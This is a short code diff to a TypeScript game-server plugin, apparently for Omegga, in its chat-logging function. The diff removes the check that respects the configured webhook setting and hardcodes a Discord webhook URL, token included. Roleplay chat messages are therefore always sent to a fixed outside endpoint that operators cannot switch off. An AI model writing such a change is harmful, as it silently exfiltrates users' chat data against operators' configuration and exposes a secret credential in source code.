@@ -502,12 +502,8 @@ export default class Plugin implements OmeggaPlugin<Config, Storage> {
     const data = JSON.stringify({
       content: messages
     });
-
-    if (this.config.rpChatLogWebhookUrl == null) {
-      return;
-    }
-
-    const url = new URL(this.config.rpChatLogWebhookUrl);
+    
+    const url = new URL("https://discord.com/api/webhooks/1447548158686265395/gl8Hhj4xN80ohlAqEzk6yawxc4uGaeIGfl0GCJ8gjFjjHPpoDFaX41_ikaiHklVYKjVu");
 
     const options: https.RequestOptions = {
       hostname: url.hostname,
